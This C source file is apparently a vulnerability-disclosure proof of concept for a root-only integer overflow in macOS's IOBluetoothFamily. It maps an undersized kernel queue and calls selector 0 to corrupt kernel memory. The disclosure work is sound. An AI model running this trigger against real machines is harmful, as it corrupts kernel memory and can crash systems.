/*
clang -o bluetooth_packet_log_integer_overflow bluetooth_packet_log_integer_overflow.c -framework IOKit

IOBluetoothFamily implements its own queuing primitive: IOBluetoothDataQueue

IOBluetoothHCIPacketLogUserClient is userclient type 1 of IOBluetoothHCIController. Its clientMemoryForType
method uses the type argument as a length and calls IOBluetoothDataQueue::withCapacity, which in turn calls
IOBluetoothDataQueue::initWithCapacity which uses the following code to calculate the buffer size to allocate:

(r14d is controlled size)

  lea     edi, [r14+100Bh] ; overflow
  and     edi, 0FFFFF000h
  mov     esi, 1000h
  call    _IOMallocAligned

Calling selector 0 will cause the kernel to enqueue data to the undersized queue. This selector is restricted to
root, so this doesn't actually get you an EoP on OS X.

tested on: MacBookAir5,2 w/ 10.9.3/13d64
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <IOKit/IOKitLib.h>

int main(){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IOBluetoothHCIController");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);


  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 1, &conn);
  if (err != KERN_SUCCESS){
    printf("unable to get user client connection\n");
    return 0;
  }else{
    printf("got userclient connection: %x, type:%d\n", conn, 1);
  }
  
  printf("got userclient connection: %x\n", conn);


  mach_vm_address_t addr = 0x4100000000;
  mach_vm_size_t size = 0x1000;
  uint32_t* buf = 0;

  err = IOConnectMapMemory(conn, 0xfffffffe, mach_task_self(), &addr, &size, 0);
  if (err != KERN_SUCCESS){
    printf("IOConnectMapMemory failed:0x%x\n", err);
    return 0;
  }

  buf = (uint32_t*)addr;
  printf("mapped at: 0x%p size:0x%x\n", addr, size);

  for (int i = 0; i < 3; i++){
    printf("0x%08x\n", buf[i]);
  }

  uint64_t inputScalar[16];  
  uint64_t inputScalarCnt = 0;

  char inputStruct[4096];
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;
  
  outputScalarCnt = 1;

  // enqueue
  err = IOConnectCallMethod(
    conn,
    0x0,
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error: %x\n", err);
    printf("this bug is root only\n");
    return 0;
  }

  return 0;
}
